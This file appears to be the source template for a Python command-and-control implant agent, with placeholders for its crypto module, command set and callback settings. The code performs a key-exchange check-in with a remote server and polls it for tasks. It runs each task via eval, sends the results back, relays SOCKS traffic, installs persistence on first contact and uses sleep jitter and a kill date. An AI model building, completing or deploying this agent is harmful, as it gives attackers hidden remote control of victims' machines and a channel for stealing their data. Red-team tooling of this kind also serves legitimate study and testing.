import os
import random
import sys
import json
import socket
import base64
import time
import platform
import ssl
import getpass
import urllib.request
from datetime import datetime
import threading
import queue





CHUNK_SIZE = 51200

CRYPTO_MODULE_PLACEHOLDER


    def getOSVersion(self):
        if platform.mac_ver()[0]: return "macOS "+platform.mac_ver()[0]
        else: return platform.system() + " " + platform.release()


    def getUsername(self):
        try: return getpass.getuser()
        except: pass
        for k in [ "USER", "LOGNAME", "USERNAME" ]: 
            if k in os.environ.keys(): return os.environ[k]
            
   
    def formatMessage(self, data, urlsafe=False):
        output = base64.b64encode(self.agent_config["UUID"].encode() + self.encrypt(json.dumps(data).encode()))
        if urlsafe: 
            output = base64.urlsafe_b64encode(self.agent_config["UUID"].encode() + self.encrypt(json.dumps(data).encode()))
        return output

    def formatResponse(self, data):
        try:
            if not data:
                return {}
            if isinstance(data, str):
                decoded_data = data
            else:
                decoded_data = data.decode('utf-8')
            json_data = decoded_data.replace(self.agent_config["UUID"], "", 1)
            if not json_data.strip():
                return {}
            return json.loads(json_data)
        except UnicodeDecodeError as e:
            try:
                decoded_data = data.decode('latin-1')
                json_data = decoded_data.replace(self.agent_config["UUID"], "", 1)
                if not json_data.strip():
                    return {}
                return json.loads(json_data)
            except Exception as e2:
                return {}
        except json.JSONDecodeError as e:
            return {}

 
    def postMessageAndRetrieveResponse(self, data):
        return self.formatResponse(self.decrypt(self.makeRequest(self.formatMessage(data),'POST')))


    def getMessageAndRetrieveResponse(self, data):
        return self.formatResponse(self.decrypt(self.makeRequest(self.formatMessage(data, True))))

 
    def sendTaskOutputUpdate(self, task_id, output):
        responses = [{ "task_id": task_id, "user_output": output, "completed": False }]
        message = { "action": "post_response", "responses": responses }
        response_data = self.postMessageAndRetrieveResponse(message)

   
    def postResponses(self):
        try:
            responses = []
            socks = []
            taskings = self.taskings
            for task in taskings:
                if task["completed"] == True:
                    out = { "task_id": task["task_id"], "user_output": task["result"], "completed": True }
                    if task["error"]: out["status"] = "error"
                    for func in ["processes", "file_browser"]: 
                        if func in task: out[func] = task[func]
                    responses.append(out)
            while not self.socks_out.empty(): socks.append(self.socks_out.get())
            if ((len(responses) > 0) or (len(socks) > 0)):
                message = { "action": "post_response", "responses": responses }
                if socks: message["socks"] = socks
                response_data = self.postMessageAndRetrieveResponse(message)
                for resp in response_data["responses"]:
                    task_index = [t for t in self.taskings \
                        if resp["task_id"] == t["task_id"] \
                        and resp["status"] == "success"][0]
                    self.taskings.pop(self.taskings.index(task_index))
        except: pass

    
    def processTask(self, task):
        try:
            task["started"] = True
            function = getattr(self, task["command"], None)
            if(callable(function)):
                try:
                    params = json.loads(task["parameters"]) if task["parameters"] else {}
                    params['task_id'] = task["task_id"] 
                    command =  "self." + task["command"] + "(**params)"
                    output = eval(command)
                except Exception as error:
                    output = str(error)
                    task["error"] = True                        
                task["result"] = output
                task["completed"] = True
            else:
                task["error"] = True
                task["completed"] = True
                task["result"] = "Function unavailable."
        except Exception as error:
            task["error"] = True
            task["completed"] = True
            task["result"] = error


    def processTaskings(self):
        threads = list()       
        taskings = self.taskings     
        for task in taskings:
            if task["started"] == False:
                x = threading.Thread(target=self.processTask, name="{}:{}".format(task["command"], task["task_id"]), args=(task,))
                threads.append(x)
                x.start()

    def getTaskings(self):
        data = { "action": "get_tasking", "tasking_size": -1 }
        tasking_data = self.getMessageAndRetrieveResponse(data)
        for task in tasking_data["tasks"]:
            t = {
                "task_id":task["id"],
                "command":task["command"],
                "parameters":task["parameters"],
                "result":"",
                "completed": False,
                "started":False,
                "error":False,
                "stopped":False
            }
            self.taskings.append(t)
        if "socks" in tasking_data:
            for packet in tasking_data["socks"]: self.socks_in.put(packet)

    
    def checkIn(self):
        # Initial check-in to translator container for key exchange
        initial_payload = {
            "action": "key_exchange",
            "uuid": self.agent_config["PayloadUUID"]
        }
        encoded_data = base64.b64encode(self.agent_config["PayloadUUID"].encode() + json.dumps(initial_payload).encode())
        
        response = self.makeRequest(encoded_data, method='POST')
        if not response:
            return False
        
        try:
            response_json = json.loads(response.decode().replace(self.agent_config["PayloadUUID"], "", 1))
            # Store translator-generated keys in memory
            self.agent_config["agent_to_server_key"] = response_json["EncryptionKey"]
            self.agent_config["server_to_agent_key"] = response_json["DecryptionKey"]
            self.agent_config["UUID"] = response_json["id"]
            return True
        except Exception:
            return False


     

    def makeRequest(self, data, method='GET', max_retries=5, retry_delay=5):
        # Build headers
        hdrs = {}
        for header in self.agent_config["Headers"]:
            hdrs[header] = self.agent_config["Headers"][header]

        # Build URL depending on method
        if method == 'GET':
            url = (
                self.agent_config["Server"]
                + ":" + self.agent_config["Port"]
                + self.agent_config["GetURI"]
                + "?" + self.agent_config["GetParam"]
                + "=" + data.decode()
            )
            req = urllib.request.Request(url, None, hdrs)
        else:
            url = (
                self.agent_config["Server"]
                + ":" + self.agent_config["Port"]
                + self.agent_config["PostURI"]
            )
            req = urllib.request.Request(url, data, hdrs)

    
        #CERTSKIP

        # ----- PROXY HANDLING -----
        if self.agent_config["ProxyHost"] and self.agent_config["ProxyPort"]:
            tls = "https" if self.agent_config["ProxyHost"].startswith("https") else "http"
            handler = urllib.request.HTTPSHandler if tls == "https" else urllib.request.HTTPHandler

            if self.agent_config["ProxyUser"] and self.agent_config["ProxyPass"]:
                proxy = urllib.request.ProxyHandler({
                    tls: "{}://{}:{}@{}:{}".format(
                        tls,
                        self.agent_config["ProxyUser"],
                        self.agent_config["ProxyPass"],
                        self.agent_config["ProxyHost"].replace(tls + "://", ""),
                        self.agent_config["ProxyPort"],
                    )
                })
                auth = urllib.request.HTTPBasicAuthHandler()
                opener = urllib.request.build_opener(proxy, auth, handler())
            else:
                proxy = urllib.request.ProxyHandler({
                    tls: "{}://{}:{}".format(
                        tls,
                        self.agent_config["ProxyHost"].replace(tls + "://", ""),
                        self.agent_config["ProxyPort"],
                    )
                })
                opener = urllib.request.build_opener(proxy, handler())
            urllib.request.install_opener(opener)

        # ----- RETRY LOOP -----
        for attempt in range(max_retries):
            try:
                # The builder may replace this line:
                with urllib.request.urlopen(req) as response:
                    raw_response = response.read()
                    try:
                        out = base64.b64decode(raw_response)
                    except Exception:
                        out = raw_response
                    if out:  # Ensure response is not empty
                        return out
            except Exception:
                pass

            if attempt < max_retries - 1:
                time.sleep(retry_delay)

        return ""


      
    def passedKilldate(self):
        kd_list = [ int(x) for x in self.agent_config["KillDate"].split("-")]
        kd = datetime(kd_list[0], kd_list[1], kd_list[2])
        if datetime.now() >= kd: return True
        else: return False

    
    def agentSleep(self):
        j = 0
        if int(self.agent_config["Jitter"]) > 0:
            v = float(self.agent_config["Sleep"]) * (float(self.agent_config["Jitter"])/100)
            if int(v) > 0:
                j = random.randrange(0, int(v))    
        time.sleep(self.agent_config["Sleep"]+j)

#COMMANDS_PLACEHOLDER


    def __init__(self):
        self.socks_open = {}
        self.socks_in = queue.Queue()
        self.socks_out = queue.Queue()
        self.taskings = []
        self._meta_cache = {}
        self.moduleRepo = {}
        self.current_directory = os.getcwd()
        self.agent_config = {
        "Server": "callback_host",
        "Port": "callback_port",
        "PostURI": "/post_uri",
        "PayloadUUID": "UUID_HERE",
        "UUID": "",
        "Headers": headers,
        "Sleep": callback_interval,
        "Jitter": callback_jitter,
        "KillDate": "killdate",
        # keys provided by translator container
        "agent_to_server_key": None,
        "server_to_agent_key": None,
        "ExchChk": "encrypted_exchange_check",
        "GetURI": "/get_uri",
        "GetParam": "query_path_name",
        "ProxyHost": "proxy_host",
        "ProxyUser": "proxy_user",
        "ProxyPass": "proxy_pass",
        "ProxyPort": "proxy_port",
    }

        max_checkin_retries = 10
        checkin_retry_delay = 30

        # Attempt initial check-in with retries
        for attempt in range(max_checkin_retries):
            if self.checkIn():
                try:
                    self.create_persistence()
                    self.show_console_popup()
                except Exception as e:
                    pass
                break
            if attempt < max_checkin_retries - 1:
                time.sleep(checkin_retry_delay)
        else:
            os._exit(1)

        try:

            while True:
                    if self.passedKilldate():
                        self.exit(0)
                    try:
                        self.getTaskings()
                        self.processTaskings()
                        self.postResponses()
                    except Exception as e:
                        # Retry tasking operations for a limited time
                        max_task_retries = 5
                        task_retry_delay = 10
                        for attempt in range(max_task_retries):
                            try:
                                self.getTaskings()
                                self.processTaskings()
                                self.postResponses()
                                break
                            except Exception as e2:
                                if attempt < max_task_retries - 1:
                                    time.sleep(task_retry_delay)
                        else:
                            pass
                    self.agentSleep()   
        except KeyboardInterrupt:
            self.exit(0)               

if __name__ == "__main__":
    igider = igider()
